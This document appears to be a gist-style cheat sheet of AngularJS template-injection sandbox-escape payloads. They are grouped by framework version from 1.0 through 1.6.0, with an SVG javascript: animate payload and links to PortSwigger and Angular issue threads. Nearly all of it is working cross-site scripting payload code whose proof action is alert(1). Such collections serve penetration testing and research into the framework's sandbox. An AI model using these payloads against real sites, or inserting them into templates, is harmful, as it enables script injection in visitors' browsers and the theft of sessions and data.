##
#
https://gist.github.com/mccabe615/cc92daaf368c9f5e15eda371728083a3
#
##

#### 1.3.2 and below 

`{{7*7}}`

```
'a'.constructor.fromCharCode=[].join;
'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';
```

```
{{
    'a'.constructor.prototype.charAt=[].join;
    $eval('x=""')+''
}}
```


```
{{
    'a'.constructor.prototype.charAt=[].join;
    $eval('x=alert(1)')+''
}}
```

`{{constructor.constructor('alert(1)')()}}`

```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

```
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```
    
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### 1.3.3 

As literal object: `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(Evaluated Object Literal)');}}`

As Array: `{{x = [''.constructor.prototype]; x[0].charAt=[].join; $eval('x=alert(Evaluated Array)');}}`

Versions 1.3.0 - 1.5.7:
```
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
```

Versions 1.2.20 - 1.2.29:
```
{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}
```

Version 1.2.19:
```
{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}
```

Versions 1.2.6 - 1.2.18:
```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

Versions 1.2.0 - 1.2.5:
```
{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}
```

SVG
```
<svg>
  <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
    <circle r="400"></circle>
    <animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" />
  </a>
</svg>
```

Angular 1.5.9
Jan Horn sandbox escape
```
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

Angular 1.6.0
```
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
{{0[a='constructor'][a]('alert(1)')()}}
```


http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
https://github.com/angular/angular.js/issues/14939
https://github.com/angular/angular.js/pull/11290
